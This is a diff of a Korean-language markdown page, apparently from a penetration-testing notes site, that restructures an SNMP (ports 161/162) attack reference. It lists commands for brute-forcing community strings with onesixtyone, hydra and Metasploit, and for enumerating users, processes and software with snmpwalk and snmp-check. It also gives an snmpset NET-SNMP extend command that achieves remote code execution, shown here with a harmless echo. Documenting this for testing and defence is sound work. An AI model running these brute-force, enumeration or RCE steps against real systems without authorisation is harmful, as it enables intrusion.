@@ -1,218 +1,113 @@
 ---
 sidebar_position: 5
+title: SNMP (Port 161/162)
 ---
 
-# snmpwalk - 161/162
+# SNMP (Port 161/162) 취약점 진단
 
-SNMP (Simple Network Management Protocol) 정보 수집 도구입니다.
+## Overview
 
-## 기본 정보
+**SNMP (Simple Network Management Protocol)**: 라우터, 스위치, 서버 등 네트워크 장비의 상태 모니터링 및 관리를 위한 프로토콜
 
-- **포트**: 161/UDP (Agent), 162/UDP (Trap)
-- **버전**: SNMPv1, SNMPv2c, SNMPv3
-- **Community String**: public (기본 읽기), private (기본 쓰기)
+**주요 포트 및 버전**:
+- **161/UDP**: SNMP Agent (정보 요청)
+- **162/UDP**: SNMP Trap (이벤트 알림)
+- **지원 버전**: v1, v2c (평문 통신, 보안 취약), v3 (인증 및 암호화 지원)
+- **Community String**: 패스워드 역할. `public`(기본 읽기), `private`(기본 쓰기)
 
-## 기본 사용법
+---
 
+## 1. Reconnaissance
+
+### Community String 스캔 및 브루트포스
 ```bash
-# 기본 (SNMPv1)
-snmpwalk -c public -v1 <RHOST>
+# [Nmap] 기본 SNMP 포트 열림 확인 및 정보 수집
+nmap -sU -p 161 --script snmp-info <target>
 
-# SNMPv2c
-snmpwalk -v2c -c public <RHOST>
+# [onesixtyone] 초고속 Community String 브루트포스 스캐너
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
 
-# 전체 MIB 트리
-snmpwalk -v2c -c public <RHOST> .1
+# [Hydra] 브루트포스 공격을 통한 Community String 탐색
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target> snmp
 ```
 
-## OID (Object Identifier)
-
-### 시스템 정보
-
+### snmp-check를 이용한 자동 열거
+가장 핵심적인 정보(시스템, 네트워크, 사용자, 프로세스 등)를 스크립트로 일괄 수집
 ```bash
-# 시스템 설명
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.1.1
+# 기본 커뮤니티(public)로 자동 스캔
+snmp-check <target>
 
-# 시스템 이름
-snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
-
-# 시스템 위치
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.1.6
-
-# 시스템 연락처
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.1.4
-
-# 시스템 가동 시간
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.1.3
+# 특정 커뮤니티 지정
+snmp-check -c private <target>
 ```
 
-### 네트워크 정보
+---
 
+## 2. Exploitation
+
+### snmpwalk를 활용한 수동 MIB 트리 조회 (SNMP v1/v2c)
 ```bash
-# IP 주소
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.20.1.1
+# 기본 시스템 트리 전체 조회
+snmpwalk -v2c -c public <target>
 
-# 라우팅 테이블
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.21.1.1
-
-# ARP 테이블
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.22.1.2
-
-# 인터페이스
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.2.2.1.2
-
-# TCP 연결
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
+# 특정 MIB (시스템 상세 정보) 조회
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1  # 시스템 설명(OS, 커널 등)
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5  # 호스트 이름
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.4  # 관리자 연락처
 ```
 
-### 프로세스 및 서비스
-
+### 주요 민감 정보 열거
 ```bash
-# 실행 중인 프로세스
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
+# 네트워크 인터페이스 및 라우팅 정보
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2.2.1.2   # 인터페이스
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20.1.1  # 할당된 IP 주소
 
-# 프로세스 경로
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.4
+# 실행 중인 프로세스 및 설치된 소프트웨어
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2  # 프로세스 목록
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2  # 설치된 소프트웨어
 
-# 프로세스 파라미터
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.5
-
-# 설치된 소프트웨어
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
+# [Windows 타겟] 로컬 사용자 및 공유 폴더
+snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25   # Windows 사용자
+snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.27   # 공유 폴더 목록
 ```
 
-### Windows 정보
-
+### SNMP v3 인증 및 암호화 접속
 ```bash
-# 사용자 목록
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
+# 인증(authNoPriv) 기반 열거
+snmpwalk -v3 -l authNoPriv -u <user> -a SHA -A <password> <target>
 
-# 공유 폴더
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
-
-# 도메인 이름
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.4.1
-
-# 로컬 사용자 이름
-snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
+# 인증 및 암호화(authPriv) 기반 열거
+snmpwalk -v3 -l authPriv -u <user> -a SHA -A <auth_pass> -x AES -X <priv_pass> <target>
 ```
 
-### 확장 객체
+---
+
+## 3. Advanced Techniques
+
+### NET-SNMP Extend를 활용한 RCE
+대상 서버의 커뮤니티가 쓰기 권한(`private`)을 가지고 있고, NET-SNMP의 `extend` 기능이 활성화된 경우 원격 코드 실행(RCE) 가능
 
 ```bash
-# nsExtendObjects
-snmpwalk -v2c -c public <RHOST> nsExtendObjects
+# 1. 원격 명령어 삽입 (명령어 이름: command, 내용: /bin/echo 'hello world')
+snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private <target> \
+  'nsExtendStatus."command"' = createAndGo \
+  'nsExtendCommand."command"' = /bin/echo \
+  'nsExtendArgs."command"' = 'hello world'
 
-# 특정 OID
-snmpwalk -v2c -c public <RHOST> 1.3.6.1.4.1.8072.1.3.2
+# 2. 주입한 명령어 트리거 및 결과 확인
+snmpwalk -v2c -c private <target> nsExtendObjects
 ```
 
-## Community String Brute Force
-
+### Metasploit 자동화 모듈
 ```bash
-# onesixtyone
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>
-
-# hydra
-hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST> snmp
-```
-
-## SNMPv3
-
-```bash
-# 사용자 열거
-snmpwalk -v3 -l authNoPriv -u <USERNAME> -a SHA -A <PASSWORD> <RHOST>
-
-# 인증 + 암호화
-snmpwalk -v3 -l authPriv -u <USERNAME> -a SHA -A <AUTH_PASSWORD> -x AES -X <PRIV_PASSWORD> <RHOST>
-```
-
-## snmp-check
-
-```bash
-# 자동화된 SNMP 열거
-snmp-check <RHOST>
-snmp-check -c public <RHOST>
-```
-
-## Nmap
-
-```bash
-# SNMP 정보 수집
-nmap -sU -p 161 --script snmp-info <RHOST>
-
-# SNMP 프로세스
-nmap -sU -p 161 --script snmp-processes <RHOST>
-
-# SNMP Windows 사용자
-nmap -sU -p 161 --script snmp-win32-users <RHOST>
-
-# SNMP 인터페이스
-nmap -sU -p 161 --script snmp-interfaces <RHOST>
-
-# 모든 SNMP 스크립트
-nmap -sU -p 161 --script snmp-* <RHOST>
-```
-
-## Metasploit
-
-```bash
-use auxiliary/scanner/snmp/snmp_enum
-set RHOSTS <RHOST>
-set COMMUNITY public
-run
-
-# SNMP 로그인
+# SNMP 로그인/브루트포스 모듈
 use auxiliary/scanner/snmp/snmp_login
-set RHOSTS <RHOST>
+set RHOSTS <target>
 set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
 run
+
+# 식별된 커뮤니티를 활용한 정보 자동 열거 모듈
+use auxiliary/scanner/snmp/snmp_enum
+set COMMUNITY public
+run
 ```
-
-## 주요 MIB OID
-
-| OID | 정보 |
-|-----|------|
-| 1.3.6.1.2.1.1.1 | 시스템 설명 |
-| 1.3.6.1.2.1.1.5 | 호스트 이름 |
-| 1.3.6.1.2.1.1.6 | 위치 |
-| 1.3.6.1.2.1.2.2.1.2 | 인터페이스 |
-| 1.3.6.1.2.1.4.20.1.1 | IP 주소 |
-| 1.3.6.1.2.1.25.1.6.0 | 프로세스 수 |
-| 1.3.6.1.2.1.25.4.2.1.2 | 프로세스 목록 |
-| 1.3.6.1.2.1.25.6.3.1.2 | 소프트웨어 |
-| 1.3.6.1.4.1.77.1.2.25 | Windows 사용자 |
-
-## 취약점
-
-### 기본 Community String
-
-```bash
-# public/private 테스트
-snmpwalk -c public -v1 <RHOST>
-snmpwalk -c private -v1 <RHOST>
-```
-
-### 정보 유출
-
-- 시스템 정보 (OS, 버전, 호스트명)
-- 네트워크 정보 (IP, 라우팅 테이블)
-- 사용자 목록
-- 프로세스 및 서비스
-- 설치된 소프트웨어
-
-### RCE (Remote Code Execution)
-
-SNMPv1/v2c에서 write community가 있으면:
-```bash
-# NET-SNMP extend
-snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private <RHOST> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = /bin/echo 'nsExtendArgs."command"' = 'hello world'
-```
-
-## 참고
-
-- 기본 Community String (public/private) 사용 시 취약
-- UDP 프로토콜이므로 스캔이 느릴 수 있음
-- SNMPv3는 인증 및 암호화 지원
-- 방화벽에서 차단 권장
-- Community String을 강력하게 설정
